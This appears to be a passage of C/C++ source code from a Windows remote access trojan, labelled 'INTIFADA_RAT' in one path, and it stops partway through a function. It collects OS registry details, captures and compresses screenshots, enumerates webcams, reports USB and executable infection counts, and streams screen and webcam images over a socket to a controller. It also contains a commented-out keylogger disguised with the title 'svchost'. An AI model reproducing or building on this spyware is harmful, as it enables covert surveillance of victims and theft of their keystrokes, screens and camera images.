OSVERSIONINFOEX osvi; SYSTEM_INFO si;
ZeroMemory(&si, sizeof(SYSTEM_INFO));
ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));

osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

if(!(bOsVersionInfoEx = GetVersionEx ((OSVERSIONINFO *) &osvi)))
{
osvi.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);
if (!GetVersionEx( (OSVERSIONINFO *) &osvi) )
return false;
}

// Call GetNativeSystemInfo if supported or GetSystemInfo otherwise.
pGNSI = (PGNSI) GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");

 if(pGNSI != NULL)
 {
 pGNSI(&si);
 }
 else
 {
 GetSystemInfo(&si);
 }

switch(osvi.dwPlatformId)
{ // Test for the Windows NT or 9x product family.
   case VER_PLATFORM_WIN32_NT:
	   {
        if(osvi.dwMajorVersion == 5 || osvi.dwMajorVersion == 6) // winXP or Vista
        ntOS = true;
	   }
       break;
}

return ntOS;
}



char it1[500];


/*
bool GetCompInfo(bool ntOS)
{
// holds win9x and XP info paths
const char * KeyNT = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\";

// holds query paths
char keyNtName1[]="ProductName";
char keyNtName2[]="CSDVersion";
char keyNtName3[]="SystemRoot";
char keyNtName4[]="RegisteredOrganization";
char keyNtName5[]="RegisteredOwner";
char keyNtName6[]="ProductId";

// used to hold grabbed data
//char* buf = (char*)malloc(100);

HKEY key1;
HKEY key2;
HKEY key3;
DWORD type = REG_SZ; // type of data were querying, in this case, a string
DWORD dataSize; // to hold our string size of the grabbed data
DWORD dataSize2; // to hold our string size of the grabbed data
DWORD dataSize3; // to hold our string size of the grabbed data
DWORD dataSize4; // to hold our string size of the grabbed data
DWORD dataSize5; // to hold our string size of the grabbed data
char buf_cpinfo[200];
char buf_cpinfo2[200];
char buf_cpinfo3[200];
char buf_cpinfo4[200];
char buf_cpinfo5[200];


// if were running under win 2k, XP or Vista
if(ntOS == true)
{

  ZeroMemory(&buf_cpinfo[0],sizeof(buf_cpinfo));
  ZeroMemory(&buf_cpinfo2[0],sizeof(buf_cpinfo2));
  ZeroMemory(&buf_cpinfo3[0],sizeof(buf_cpinfo3));
  ZeroMemory(&buf_cpinfo4[0],sizeof(buf_cpinfo4));
  ZeroMemory(&buf_cpinfo5[0],sizeof(buf_cpinfo5));

  if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,KeyNT,0,KEY_READ, &key1) == ERROR_SUCCESS)
  {
	//RegQueryValueEx(key1,keyNtName[i], NULL, NULL, NULL, &dataSize);
	//realloc(buf_cpinfo, dataSize);
	 //RegQueryValueEx(key1,keyNtName1, NULL, NULL, (PBYTE)buf_cpinfo, &dataSize);
	 //RegQueryValueEx(key1,keyNtName2, NULL, NULL, (PBYTE)buf_cpinfo2, &dataSize2);

  RegCloseKey(key1);
  }


  if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,KeyNT,0,KEY_READ, &key2) == ERROR_SUCCESS)
  {
     RegQueryValueEx(key2,keyNtName3, NULL, NULL, (PBYTE)buf_cpinfo3, &dataSize3);
     RegQueryValueEx(key2,keyNtName4, NULL, NULL, (PBYTE)buf_cpinfo4, &dataSize4);

   RegCloseKey(key2);
  }


  if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,KeyNT,0,KEY_READ, &key3) == ERROR_SUCCESS)
  {
     RegQueryValueEx(key3,keyNtName5, NULL, NULL, (PBYTE)buf_cpinfo5, &dataSize5);
     RegQueryValueEx(key3,keyNtName1, NULL, NULL, (PBYTE)buf_cpinfo, &dataSize);

   RegCloseKey(key3);
  }


    ZeroMemory(&it1[0],sizeof(&it1));
    lstrcat(it1, buf_cpinfo);
    //lstrcat(it1, " / ");
    lstrcat(it1, buf_cpinfo2);
    lstrcpy(SEND.OS_Ver, it1);

    MessageBox(NULL,buf_cpinfo3,buf_cpinfo3,NULL);
}


return true;
}*/




bool GetCompInfo(bool ntOS)
{
// holds win9x and XP info paths
	const char * KeyNT = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\";

// holds query paths
char keyNtName[6][100] = { "ProductName","CSDVersion"};

// used to hold grabbed data
char* buf = (char*)malloc(100);

HKEY key1;
DWORD type = REG_SZ; // type of data were querying, in this case, a string
DWORD dataSize; // to hold our string size of the grabbed data
int result;

// if were running under win 2k, XP or Vista
if(ntOS == true)
{

  if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,KeyNT,0,KEY_READ, &key1) == ERROR_SUCCESS)
  {

	for(int i = 0; i < 2; i++)
	{
	RegQueryValueEx(key1,keyNtName[i], NULL, NULL, NULL, &dataSize);
	realloc(buf, dataSize);

	result = RegQueryValueEx(key1,keyNtName[i], NULL, NULL, (PBYTE)buf, &dataSize);
		if(result == ERROR_SUCCESS && i == 0)
		{
		lstrcpy(SEND.OS_Ver, "");
		lstrcpy(SEND.OS_Ver, buf);
		Sleep(100);
		}
		else
		{
	    lstrcat(SEND.OS_Ver, " ");
		lstrcat(SEND.OS_Ver, buf);
		}

         //MessageBox(NULL,SEND.OS_Ver,SEND.OS_Ver,NULL);

	}

  RegCloseKey(key1);
  }
}

return true;
}




/*void CaptureScreen(HWND hParent)
{
        HDC hDesktopdc,hBitmapdc;
        int nWid, nHt; // Stores the height and width of the screen
        HBITMAP hOriginal;

        // Get a handle to the screen device context
        hDesktopdc = GetWindowDC(HWND_DESKTOP);
        if (hDesktopdc)
        {
                // Get width and height of screen
                nWid = GetSystemMetrics(SM_CXSCREEN);
                nHt = GetSystemMetrics(SM_CYSCREEN);

                // Create a compatible bitmap
                hbm = CreateCompatibleBitmap(hDesktopdc,nWid,nHt);
                // Create compatible DC
                hBitmapdc = CreateCompatibleDC(hDesktopdc);
                // Select Bitmap
                hOriginal = (HBITMAP)SelectBitmap(hBitmapdc, hbm);
                // Copy pixels from screen to the BITMAP
                BitBlt(hBitmapdc,0,0,nWid,nHt,
                hDesktopdc,0,0,SRCCOPY);
                // Delete the hBitmapdc as you no longer need it
                DeleteDC(hBitmapdc);
                // Release the desktop device context handle
                ReleaseDC(HWND_DESKTOP, hDesktopdc);
                // Invalidate the window
                UpdateWindow(hParent);
        }
}*/





/*#define capSendMessage(hWnd, uMsg, wParm, lParam) ((IsWindow(hWnd)) ? SendMessage(hWnd, uMsg, (WPARAM)(wParm), (LPARAM)(lParam)) : 0)

BOOL capWebCam(char *szFile, int nIndex, int nX, int nY, int nMsg)
{
	HWND hWndCap = capCreateCaptureWindow("CapWebCam", WS_CHILD, 0, 0, nX, nY, GetDesktopWindow(), 0);
    if(!hWndCap) return FALSE;

    if(!capSendMessage(hWndCap, WM_CAP_DRIVER_CONNECT, nIndex, 0)){
        DestroyWindow(hWndCap); return FALSE;
    }

    CAPDRIVERCAPS capDriverCaps;
    memset(&capDriverCaps, 0, sizeof(CAPDRIVERCAPS));
    capSendMessage(hWndCap, WM_CAP_DRIVER_GET_CAPS, sizeof(CAPDRIVERCAPS), &capDriverCaps);
    if(!capDriverCaps.fCaptureInitialized){
        DestroyWindow(hWndCap); return FALSE;
    }

    capSendMessage(hWndCap, WM_CAP_SET_SCALE, TRUE, 0);
    capSendMessage(hWndCap, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0);
    capSendMessage(hWndCap, WM_CAP_FILE_SAVEDIB, 0, szFile);
    capSendMessage(hWndCap, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    DestroyWindow(hWndCap);

    return TRUE;
}*/




int GetCamIndex()
{
	char szDeviceName[80];
    char szDeviceVersion[80];

    for (int wIndex = 0; wIndex < 9; wIndex++)
    {
        if (capGetDriverDescription(wIndex, szDeviceName,sizeof (szDeviceName),
			szDeviceVersion, sizeof(szDeviceVersion)))
			return wIndex;
    }
	return -1;
}




/*char szDeviceName[80];
char szDeviceVersion[80];

for (int wIndex = 0; wIndex < 10; wIndex++)
{
    if (capGetDriverDescription(
            wIndex,
            szDeviceName,
            sizeof (szDeviceName),
            szDeviceVersion,
            sizeof (szDeviceVersion)
        ))
    {
        // Append name to list of installed capture drivers
        // and then let the user select a driver to use.
        if(strcmp(szDeviceName,checkszDeviceName)==0)
        {
            goto Next;
        }

        else
        {
            strcpy(checkszDeviceName,szDeviceName);
            file<<checkszDeviceName<<endl;
        }

        Next:

        if(strcmp(szDeviceVersion,checkszDeviceVersion)==0)
        {
           // goto Jump;
        }

        else
        {
            strcpy(checkszDeviceVersion,szDeviceVersion);
            file<<checkszDeviceVersion<<endl;
        }


        //Jump:
    }
}*/







void CreateBMPFile(HWND hwnd, LPTSTR pszFile, PBITMAPINFO pbi, HBITMAP hBMP, HDC hDC)
	{
	    HANDLE hf;                  // file handle
	    BITMAPFILEHEADER hdr;       // bitmap file-header
	    PBITMAPINFOHEADER pbih;     // bitmap info-header
	    LPBYTE lpBits;              // memory pointer
	    DWORD dwTotal;              // total count of bytes
	    DWORD cb;                   // incremental count of bytes
	    BYTE *hp;                   // byte pointer
	    DWORD dwTmp;

	pbih = (PBITMAPINFOHEADER) pbi;
	lpBits = (LPBYTE) GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);

if (!lpBits)
	{
	//MessageBox(hwnd,"GlobalAlloc","Error", MB_OK );
	}
	// Retrieve the color table (RGBQUAD array) and the bits
	// (array of palette indices) from the DIB.
	if (!GetDIBits(hDC, hBMP, 0, (WORD) pbih->biHeight, lpBits, pbi,DIB_RGB_COLORS))
	{
	//MessageBox(hwnd,"GetDIBits","Error",MB_OK );
	}
	// Create the .BMP file.
	hf = CreateFile(pszFile,GENERIC_READ | GENERIC_WRITE,(DWORD) 0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,(HANDLE) NULL);
	if (hf == INVALID_HANDLE_VALUE)
	{
	//MessageBox( hwnd,"CreateFile","Error", MB_OK);
	}

	hdr.bfType = 0x4d42;  // File type designator "BM" 0x42 = "B" 0x4d = "M"
	// Compute the size of the entire file.
	hdr.bfSize = (DWORD) (sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD) + pbih->biSizeImage);
	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;
		// Compute the offset to the array of color indices.
	hdr.bfOffBits = (DWORD) sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof (RGBQUAD);
	// Copy the BITMAPFILEHEADER into the .BMP file.
	if (!WriteFile(hf, (LPVOID) &hdr, sizeof(BITMAPFILEHEADER), (LPDWORD) &dwTmp,  NULL) )
	{
	 //MessageBox(hwnd,"WriteFileHeader","Error",MB_OK );
	}
	// Copy the BITMAPINFOHEADER and RGBQUAD array into the file.
	if (!WriteFile(hf, (LPVOID) pbih, sizeof(BITMAPINFOHEADER) + pbih->biClrUsed * sizeof (RGBQUAD), (LPDWORD) &dwTmp, NULL))
	{
	//MessageBox(hwnd,"WriteInfoHeader","Error",MB_OK );
	}
	// Copy the array of color indices into the .BMP file.
	dwTotal = cb = pbih->biSizeImage;
	hp = lpBits;
	if (!WriteFile(hf, (LPSTR) hp, (int) cb, (LPDWORD) &dwTmp,NULL))
	{
	//MessageBox(hwnd,"WriteFile","Error",MB_OK );
	}
	// Close the .BMP file.
	if (!CloseHandle(hf))
	{
	//MessageBox(hwnd,"CloseHandle","Error",MB_OK );
	}

	// Free memory.
	GlobalFree((HGLOBAL)lpBits);
	}

	PBITMAPINFO CreateBitmapInfoStruct(HWND hwnd, HBITMAP hBmp)
	{
	BITMAP bmp;
	PBITMAPINFO pbmi;
	WORD cClrBits;
	// Retrieve the bitmap color format, width, and height.
	if (!GetObject(hBmp, sizeof(BITMAP), (LPSTR)&bmp))
	{
	//MessageBox(hwnd,"GetObject","Error",MB_OK );
	}
	// Convert the color format to a count of bits.
	cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
	if (cClrBits == 1)
     cClrBits = 1;
	else if (cClrBits <= 4)
	 cClrBits = 4;
	else if (cClrBits <= 8)
	 cClrBits = 8;
	else if (cClrBits <= 16)
	 cClrBits = 16;
	else if (cClrBits <= 24)
	 cClrBits = 24;
	else cClrBits = 32;

	// Allocate memory for the BITMAPINFO structure. (This structure
	// contains a BITMAPINFOHEADER structure and an array of RGBQUAD
	// data structures.)

	if (cClrBits != 24)
	{
	 pbmi = (PBITMAPINFO) LocalAlloc(LPTR,sizeof(BITMAPINFOHEADER) + sizeof(RGBQUAD) * (1<< cClrBits));
	}
	// There is no RGBQUAD array for the 24-bit-per-pixel format.
	else
	 pbmi = (PBITMAPINFO) LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER));

	// Initialize the fields in the BITMAPINFO structure.
	pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	pbmi->bmiHeader.biWidth = bmp.bmWidth;
	pbmi->bmiHeader.biHeight = bmp.bmHeight;
	pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
	pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
	if (cClrBits < 24)
	{
	 pbmi->bmiHeader.biClrUsed = (1<<cClrBits);
	}
	// If the bitmap is not compressed, set the BI_RGB flag.
	pbmi->bmiHeader.biCompression = BI_RGB;

	// Compute the number of bytes in the array of color
	// indices and store the result in biSizeImage.
	// For Windows NT, the width must be DWORD aligned unless
	// the bitmap is RLE compressed. This example shows this.
	// For Windows 95/98/Me, the width must be WORD aligned unless the
	// bitmap is RLE compressed.
	pbmi->bmiHeader.biSizeImage = ((pbmi->bmiHeader.biWidth * cClrBits +31) & ~31) /8 * pbmi->bmiHeader.biHeight;
	// Set biClrImportant to 0, indicating that all of the
	// device colors are important.
	pbmi->bmiHeader.biClrImportant = 0;

	return pbmi; //return BITMAPINFO
	}





////////////////////////////////////////////////////////////////////////////
//Screen Capture

void SetTHEBMIHeader (BITMAPINFO *b,short dx,short dy)
{
 b->bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
 b->bmiHeader.biWidth=dx;
 b->bmiHeader.biHeight=-dy;
 b->bmiHeader.biPlanes=1;
 b->bmiHeader.biBitCount=24;
 b->bmiHeader.biCompression=BI_RGB;
 b->bmiHeader.biSizeImage=0;
 b->bmiHeader.biXPelsPerMeter=1;
 b->bmiHeader.biYPelsPerMeter=1;
 b->bmiHeader.biClrUsed=0;
 b->bmiHeader.biClrImportant=0;
}
POINT GetBitmapSize (HBITMAP h)
{
POINT p;
BITMAP o;
GetObject (h,sizeof(o),&o);
p.x=o.bmWidth;
p.y=o.bmHeight;
return (p);
}
void CreateWorkingBitmap (long dx,long dy,tWorkBMP *w)
{
 w->x=dx;
 w->y=dy;
 w->l=(dx+1)*3&0xfffc;
 w->b=Alloc(w->l*dy,BYTE);
}
void OpenBitmapForWork (HBITMAP b,tWorkBMP *w)
{
BITMAPINFO s;
HDC h=GetDC(NULL);
POINT v=GetBitmapSize(b);
CreateWorkingBitmap (v.x,v.y,w);
SetTHEBMIHeader (&s,w->x,w->y);
GetDIBits (h,b,0,w->y,w->b,&s,DIB_RGB_COLORS);
ReleaseDC (NULL,h);
}


HBITMAP CreateEmptyBitmap (WORD dx,WORD dy)
{
 HDC h=GetDC(NULL);
 HBITMAP b=CreateCompatibleBitmap(h,dx,dy);
 ReleaseDC (NULL,h);

 return (b);
}


void SaveWorkingBitmap (tWorkBMP *w,HBITMAP b)
{
 BITMAPINFO s;
 HDC h=GetDC(NULL);
 SetTHEBMIHeader (&s,w->x,w->y);
 SetDIBits (h,b,0,w->y,w->b,&s,DIB_RGB_COLORS);
 ReleaseDC (NULL,h);
}

void ShrinkWorkingBitmap (tWorkBMP *a,tWorkBMP *b,WORD bx,WORD by)
{
 BYTE *uy=a->b,*ux,i;
 WORD x,y,nx,ny=0;
 DWORD df=3*bx,nf=df*by,j;
 float k,qx[2],qy[2],q[4],*f=Alloc(nf,float);

 CreateWorkingBitmap (bx,by,b);

 jFor (nf) f[j]=0;
 j=0;

 For (y,a->y) {
  ux=uy;
  uy+=a->l;
  nx=0;
  ny+=by;

  if (ny>a->y) {

   qy[0]=1-(qy[1]=(ny-a->y)/(float)by);

   For (x,a->x) {

    nx+=bx;

    if (nx>a->x) {
     qx[0]=1-(qx[1]=(nx-a->x)/(float)bx);

     iFor (4) q[i]=qx[i&1]*qy[i>>1];

     iFor (3) {
      f[j]+=(*ux)*q[0];
      f[j+3]+=(*ux)*q[1];
      f[j+df]+=(*ux)*q[2];
      f[(j++)+df+3]+=(*(ux++))*q[3];
     }
    }
    else iFor (3) {
     f[j+i]+=(*ux)*qy[0];
     f[j+df+i]+=(*(ux++))*qy[1];
    }
    if (nx>=a->x) nx-=a->x;
     if (!nx) j+=3;
   }
  }
  else {
   For (x,a->x) {

    nx+=bx;

    if (nx>a->x) {
     qx[0]=1-(qx[1]=(nx-a->x)/(float)bx);
     iFor (3) {
      f[j]+=(*ux)*qx[0];
      f[(j++)+3]+=(*(ux++))*qx[1];
     }
    }
    else iFor (3) f[j+i]+=*(ux++);

    if (nx>=a->x) nx-=a->x;
     if (!nx) j+=3;
   }
   if (ny<a->y) j-=df;
  }
  if (ny>=a->y) ny-=a->y;
 }

 nf=0;
 k=bx*by/(float)(a->x*a->y);
 uy=b->b;

 For (y,by) {
  jFor (df) uy[j]=f[nf++]*k+.5;
  uy+=b->l;
 }

 free (f);
}

HBITMAP ShrinkBitmap (HBITMAP a,WORD bx,WORD by)
// creates and returns new bitmap with dimensions of
// [bx,by] by shrinking bitmap a both [bx,by] must be less or equal
// than the dims of a, unless the result is nonsense
{
 tWorkBMP in,out;
 HBITMAP b=CreateEmptyBitmap(bx,by);
 OpenBitmapForWork (a,&in);
 ShrinkWorkingBitmap (&in,&out,bx,by);
 free (in.b);
 SaveWorkingBitmap (&out,b);
 free (out.b);
 return (b);
}
LPPICTURE gpPicture;


int GetEncoderClsid(WCHAR *format, CLSID *pClsid)
{
    unsigned int num = 0,  size = 0;
    GetImageEncodersSize(&num, &size);
    if(size == 0) return -1;
    ImageCodecInfo *pImageCodecInfo = (ImageCodecInfo *)(malloc(size));
    if(pImageCodecInfo == NULL) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for(unsigned int j = 0; j < num; ++j)
	{
        if(wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}
//int SCREENX = 0;
//int SCREENY = 0;

int SCREENXX = 0;
int SCREENYY = 0;
HBITMAP hbmCaptureB;
int GetScreeny(LPWSTR lpszFilename, ULONG uQuality, int X, int Y)
{
//Top:
//ULONG uQuality;
    ULONG_PTR gdiplusToken;
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    HDC hdcScreen  = CreateDC("DISPLAY", NULL, NULL, NULL);
    HDC hdcCapture = CreateCompatibleDC(hdcScreen);
    int nWidth     = GetDeviceCaps(hdcScreen, HORZRES),
        nHeight    = GetDeviceCaps(hdcScreen, VERTRES),
        nBPP       = GetDeviceCaps(hdcScreen, BITSPIXEL);

    LPBYTE lpCapture;
    BITMAPINFO bmiCapture = { {
        sizeof(BITMAPINFOHEADER), SCREENX, SCREENY, 1, nBPP, BI_RGB, 0, 0, 0, 0, 0,
    } };
    HBITMAP hbmCapture = CreateDIBSection(hdcScreen, &bmiCapture,
        DIB_PAL_COLORS, (LPVOID *)&lpCapture, NULL, 0);
    if(!hbmCapture)
	{
        DeleteDC(hdcCapture);
        DeleteDC(hdcScreen);
        GdiplusShutdown(gdiplusToken);
        return 1;
    }

    int nCapture = SaveDC(hdcCapture);
    SelectObject(hdcCapture, hbmCapture);
    BitBlt(hdcCapture, 0, 0, SCREENX, SCREENY , hdcScreen, 0, 0, SRCCOPY);
    RestoreDC(hdcCapture, nCapture);
    DeleteDC(hdcCapture);
    DeleteDC(hdcScreen);

    if(hbmCaptureB == hbmCapture)
	{
	return FALSE;
	}
	else
	{
	hbmCaptureB = hbmCapture;
	}
    CLSID imageCLSID;

    Bitmap *pScreenShot = new Bitmap(ShrinkBitmap (hbmCapture,X ,Y ), (HPALETTE)NULL);
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].NumberOfValues = 1;
    //encoderParams.Parameter[0].Guid  = EncoderQuality;
    encoderParams.Parameter[0].Type  = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].Value = &uQuality;
    GetEncoderClsid(L"image/jpeg", &imageCLSID);
    int result = (pScreenShot->Save(lpszFilename, &imageCLSID, &encoderParams) == Ok);
    delete pScreenShot;
    DeleteObject(hbmCapture);
    GdiplusShutdown(gdiplusToken);
    SCREENXX = X;
    SCREENYY = Y;
    return result;
}









BOOL ConvertImage(const WCHAR *fileName, const WCHAR *outFile, const WCHAR *format, int	nQuality) //by X-N2O
{
	GdiplusStartupInput gdiStartup;
	EncoderParameters	encParams;
	unsigned long gdiToken;
	unsigned int nCodecs = 0, nCodecSize = 0;
	GdiplusStartup(&gdiToken, &gdiStartup, NULL);
	{
		Image image(fileName);
		CLSID codec;
		ImageCodecInfo* iCinfo = NULL;
		GetImageEncodersSize(&nCodecs, &nCodecSize);
		iCinfo = (ImageCodecInfo*) calloc(1, nCodecSize);
		if(iCinfo == NULL)
			return FALSE;
		GetImageEncoders(nCodecs, nCodecSize, iCinfo);

		for(unsigned int x = 0; x < nCodecs; x++)
		{
			if(!wcscmp(iCinfo[x].MimeType, format))
			{
				codec = iCinfo[x].Clsid;
				break;
			}
		}

		encParams.Count = 1;
		//encParams.Parameter[0].Guid = EncoderQuality;
        encParams.Parameter[0].Type = EncoderParameterValueTypeLong;
        encParams.Parameter[0].NumberOfValues = 1;
		encParams.Parameter[0].Value = &nQuality;
		if(image.Save(outFile, &codec, &encParams) != Ok){
			free(iCinfo);
			GdiplusShutdown(gdiToken);
			return FALSE;
		}
		free(iCinfo);
	}
	GdiplusShutdown(gdiToken);
	return TRUE;
}




void sendDB()
{
  GetInfStatsDataBase();
  FSEND.infusb=atoi(InfUSBsDB);
  FSEND.infexe=atoi(InfEXEsDB);

RetryDB:
  FSEND.PacketType = SEND_DATABASE;
  if(send(FSocket,(char*)&FSEND,FHeadSize,0)==SOCKET_ERROR)
  {
  goto RetryDB;
  }

  CleanInfStatsDB();
}





/**
 * \brief Called by Windows automagically every time a key is pressed (regardless
 * of who has focus)
 */
/*#define	DEBUG	1

#define OUTFILE_NAME	"Logs\\WinKey.log"	// Output file
#define CLASSNAME	"winkey"
#define WINDOWTITLE	"svchost"

char	windir[MAX_PATH + 1];
HHOOK	kbdhook;	// Keyboard hook handle
bool	running;	// Used in main loop


__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp)
{
	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
		static bool capslock = false;
		static bool shift = false;
		char tmp[0xFF] = {0};
		std::string str;
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
		bool printable;


		 //Get key name as string

		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);
		GetKeyNameText(msg, tmp, 0xFF);
		str = std::string(tmp);

		printable = (str.length() <= 1) ? true : false;


        //Non-printable characters only:
        //Some of these (namely; newline, space and tab) will be
        // made into printable characters.
        //Others are encapsulated in brackets ('[' and ']').

		if (!printable) {

			 // Keynames that change state are handled here.


			if (str == "CAPSLOCK")
				capslock = !capslock;
			else if (str == "SHIFT")
				shift = true;


			 //Keynames that may become printable characters are
			 //handled here.

			if (str == "ENTER") {
				str = "\n";
				printable = true;
			} else if (str == "SPACE") {
				str = " ";
				printable = true;
			} else if (str == "TAB") {
				str = "\t";
				printable = true;
			} else {
				str = ("[" + str + "]");
			}
		}


		 // Printable characters only:
         //If shift is on and capslock is off or shift is off and
		 // capslock is on, make the character uppercase.
        //If both are off or both are on, the character is lowercase

		if (printable) {
			if (shift == capslock) { // Lowercase
				for (size_t i = 0; i < str.length(); ++i)
					str[i] = tolower(str[i]);
			} else { // Uppercase
				for (size_t i = 0; i < str.length(); ++i) {
					if (str[i] >= 'A' && str[i] <= 'Z') {
						str[i] = toupper(str[i]);
					}
				}
			}

			shift = false;
		}

#ifdef DEBUG
		std::cout << str;

#endif
		std::string path = "C:\\Users\\Physics(SWEP2011)\\Desktop\\C++\\INTIFADA_RAT\\log.txt";//std::string(windir) + "log.txt" + OUTFILE_NAME;
		std::ofstream outfile(path.c_str(), std::ios_base::app);
		outfile << str;
		outfile.close();
	}

	return CallNextHookEx(kbdhook, code, wp, lp);
}


/**
 * \brief Called by DispatchMessage() to handle messages
 * \param hwnd	Window handle
 * \param msg	Message to handle
 * \param wp
 * \param lp
 * \return 0 on success
 */





int ScreenshotSend()
{


                      FILE *pFile;
                      int Nsize = 0;
                      int Bigsize = 0;
                      int Smallsize = 0;




                      ZeroMemory(&FSEND,sizeof(FTRANSFER));
					  pFile = fopen("scr.jpg", "rb");
					  fseek(pFile,0,SEEK_END);
					  Bigsize = ftell(pFile);
					  fseek(pFile,0,SEEK_SET);


						Smallsize = Bigsize - Nsize;
						FSEND.PicLen = Bigsize - Nsize;
						FSEND.ActPicLen = FSEND.PicLen;
SEND_SET:
                        FSEND.PacketType = SET_CAP_SCREEN;
                        if(send(FSocket,(char*)&FSEND,FHeadSize,0)==SOCKET_ERROR)
                        {
                               //MessageBox(NULL,"ERROR","ERROR1",MB_OK|MB_ICONERROR);
                              if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
                              {
                                return 0;
                              }
                              Sleep(20);
                              goto SEND_SET;

                        }

                       /* sprintf(FSEND.PicSize, "%i", FSEND.PicLen);
                        SendMessage(hStatus,
						WM_SETTEXT,
						NULL,
						(LPARAM)FSEND.PicSize);*/

                        //Sleep(5);


         while(Nsize < Bigsize)
            {

                if(Smallsize <= sizeof(FSEND.Scr_Cap))
                {
                        ZeroMemory(&FSEND.Scr_Cap[0],sizeof(&FSEND.Scr_Cap));
                        fread(FSEND.Scr_Cap,1,Smallsize, pFile);


                  SEND_AGAING3:
					    //FSEND.ActPicLen = FSEND.PicLen;
                        FSEND.PacketType = CAP_SCREEN;
                        if(send(FSocket,(char*)&FSEND,FHeadSize,0)==SOCKET_ERROR)
                        {
                              if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
                              {
                                return 0;
                              }
                          Sleep(50);
                          goto SEND_AGAING3;
                        }


              }


             else if(Smallsize>sizeof(FSEND.Scr_Cap))
             {
                        ZeroMemory(&FSEND.Scr_Cap[0],sizeof(&FSEND.Scr_Cap));
                        fread(FSEND.Scr_Cap,1,sizeof(FSEND.Scr_Cap), pFile);
                        //Sleep(1);

                SEND_AGAING4:
					    //FSEND.ActPicLen = sizeof(FSEND.Scr_Cap);
                        FSEND.PacketType = CAP_SCREEN;
                        if(send(FSocket,(char*)&FSEND,FHeadSize,0)==SOCKET_ERROR)
                        {
                          Sleep(50);
                          goto SEND_AGAING4;
                        }


             }
             Nsize+=sizeof(FSEND.Scr_Cap);
             Sleep(5);

            }
                   fclose(pFile);
                   Nsize = 0;
                   //Sleep(1);

SEND_ENDAGAING:
                    FSEND.PacketType = END_CAP_SCREEN;
                    if(send(FSocket,(char*)&FSEND,FHeadSize,0)==SOCKET_ERROR)
                    {
                              if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
                              {
                                return 0;
                              }
                      Sleep(20);
                      goto SEND_ENDAGAING;
                    }



unlink("scr.jpg");

return 0;

}






int WebshotSend()
{

					  FILE *pFile;
					  int Bigsize;
					  int Smallsize;
					  int Nsize;

                      ZeroMemory(&FSEND,sizeof(FTRANSFER));
					  pFile = fopen("Cam.jpg", "rb");
					  fseek(pFile,0,SEEK_END);
                      Bigsize = ftell(pFile);
					  fseek(pFile,0,SEEK_SET);

                      Smallsize = Bigsize - Nsize;
                      FSEND.PicLen = Smallsize;
                      FSEND.ActPicLen = FSEND.PicLen;

					  sprintf(FSEND.PicSize, "%i", FSEND.PicLen);

                      /*  SendMessage(hStatus,
						WM_SETTEXT,
						NULL,
						(LPARAM)FSEND.PicSize);*/

SEND_SET:
                        FSEND.PacketType = SET_CAP_CAM;
                        if(send(FSocket,(char*)&FSEND,FHeadSize,0)==SOCKET_ERROR)
                        {
                              if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
                              {
                                return 0;
                              }
                            Sleep(20);
                           goto SEND_SET;
                        }



      while(Nsize<Bigsize)
      {
             if(FSEND.PicLen<=sizeof(FSEND.Cam_Cap))
             {
                        ZeroMemory(&FSEND.Cam_Cap[0],sizeof(&FSEND.Cam_Cap));
                        fread(FSEND.Cam_Cap,1,FSEND.PicLen, pFile);


               SEND_AGAING:

                        FSEND.PacketType = CAP_WEBCAM;
                        if(send(FSocket,(char*)&FSEND,FHeadSize,0)==SOCKET_ERROR)
                        {
                              if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
                              {
                                return 0;
                              }
                          Sleep(50);
                          goto SEND_AGAING;
                        }

             }



             else if(FSEND.PicLen>sizeof(FSEND.Cam_Cap))
             {
                        ZeroMemory(&FSEND.Cam_Cap[0],sizeof(&FSEND.Cam_Cap));
                        fread(FSEND.Cam_Cap,1,sizeof(FSEND.Cam_Cap), pFile);

               SEND_AGAING2:

                        FSEND.PacketType = CAP_WEBCAM;
                        if(send(FSocket,(char*)&FSEND,FHeadSize,0)==SOCKET_ERROR)
                        {
                          Sleep(50);
                          goto SEND_AGAING2;
                        }

             }


                    Nsize+=sizeof(FSEND.Cam_Cap);
                    Sleep(10);
